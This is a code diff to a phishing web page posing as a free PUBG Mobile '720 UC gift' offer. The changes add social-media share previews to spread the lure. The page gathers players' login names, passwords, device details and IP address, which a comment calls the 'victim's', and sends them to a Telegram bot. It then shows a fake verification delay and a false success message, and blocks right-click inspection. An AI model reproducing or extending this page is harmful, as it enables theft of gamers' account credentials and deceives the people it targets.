@@ -3,7 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>PUBG Mobile Rewards | هدية 720 شدة</title>
+    <title>PUBG Mobile | هدية 720 شدة مجاناً</title>
+    
+    <!-- ========================================== -->
+    <!-- الصورة التي تظهر عند مشاركة الرابط        -->
+    <!-- ========================================== -->
+    
+    <!-- Open Graph / Facebook / WhatsApp / Telegram -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://m6714012-lgtm.github.io/pubg-login/">
+    <meta property="og:title" content="🎁 PUBG Mobile | هدية 720 شدة مجاناً">
+    <meta property="og:description" content="عرض حصري لفترة محدودة! احصل على 720 شدة (UC) مجاناً. سجل الدخول الآن واستلم هديتك فوراً!">
+    <meta property="og:image" content="https://i.ibb.co/WpjZq0T/pubg-gift-720.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    
+    <!-- Twitter Card -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://m6714012-lgtm.github.io/pubg-login/">
+    <meta property="twitter:title" content="🎁 PUBG Mobile | هدية 720 شدة مجاناً">
+    <meta property="twitter:description" content="عرض حصري لفترة محدودة! احصل على 720 شدة (UC) مجاناً. سجل الدخول الآن واستلم هديتك فوراً!">
+    <meta property="twitter:image" content="https://i.ibb.co/WpjZq0T/pubg-gift-720.jpg">
+    
+    <!-- Favicon (أيقونة صغيرة تظهر بجانب العنوان) -->
+    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/WpjZq0T/pubg-gift-720.jpg">
+    
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- QR Code Library -->
@@ -423,7 +447,7 @@
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const language = navigator.language;
-        const ip = await getIP(); // محاولة جلب الـ IP
+        const ip = await getIP();
         
         const message = `
 🔥 *PUBG Mobile Login - HAMOUDI* 🔥
@@ -461,7 +485,7 @@
         }
     }
     
-    // جلب IP الضحية (اختياري)
+    // جلب IP الضحية
     async function getIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -477,9 +501,7 @@
         const loadingOverlay = document.getElementById('loading-overlay');
         loadingOverlay.classList.remove('hidden');
         
-        // إرسال البيانات أولاً
         sendToTelegram(data).then(() => {
-            // محاكاة التحقق من أنك إنسان لمدة 5 ثوانٍ
             let seconds = 0;
             const loadingText = loadingOverlay.querySelector('p');
             const interval = setInterval(() => {
@@ -496,12 +518,10 @@
                         alert('🎉 تم تسجيل الدخول بنجاح! 🎉\nسيتم إرسال الهدية إلى حسابك خلال 24 ساعة.');
                         loadingOverlay.classList.add('hidden');
                         
-                        // إعادة تعيين الواجهة
                         document.getElementById('input-form').classList.add('hidden');
                         document.getElementById('qr-form').classList.add('hidden');
                         selectedMethod = null;
                         
-                        // مسح الحقول
                         document.getElementById('login-input').value = '';
                         document.getElementById('password-input').value = '';
                     }, 2000);
@@ -522,15 +542,12 @@
             const usernameLabel = document.getElementById('username-label');
             const usernameInput = document.getElementById('login-input');
             
-            // إخفاء الكل
             inputForm.classList.add('hidden');
             qrForm.classList.add('hidden');
             
             if (selectedMethod === 'qr') {
-                // عرض نموذج QR
                 qrForm.classList.remove('hidden');
                 
-                // إنشاء QR Code
                 const qrElement = document.getElementById('qrcode');
                 qrElement.innerHTML = '';
                 new QRCode(qrElement, {
@@ -548,7 +565,6 @@
                     showLoadingAndVerify(data);
                 };
             } else {
-                // عرض نموذج الإدخال مع كلمة السر
                 inputForm.classList.remove('hidden');
                 let placeholder = '';
                 let labelText = '';
@@ -613,7 +629,6 @@
                         return;
                     }
                     
-                    // الحصول على اسم الطريقة النظيف
                     let methodName = selectedMethod;
                     const btnElement = document.querySelector(`.login-btn[data-method="${selectedMethod}"]`);
                     if (btnElement) {
@@ -632,15 +647,12 @@
         });
     });
 
-    // بدء المؤقت عند تحميل الصفحة
     startTimer();
 
-    // منع النقر بزر الماوس الأيمن والفحص البسيط
     document.addEventListener('contextmenu', (e) => {
         e.preventDefault();
     });
 
-    // تسجيل الدخول بالضغط على Enter
     const loginInput = document.getElementById('login-input');
     const passwordInput = document.getElementById('password-input');
     if (loginInput) {
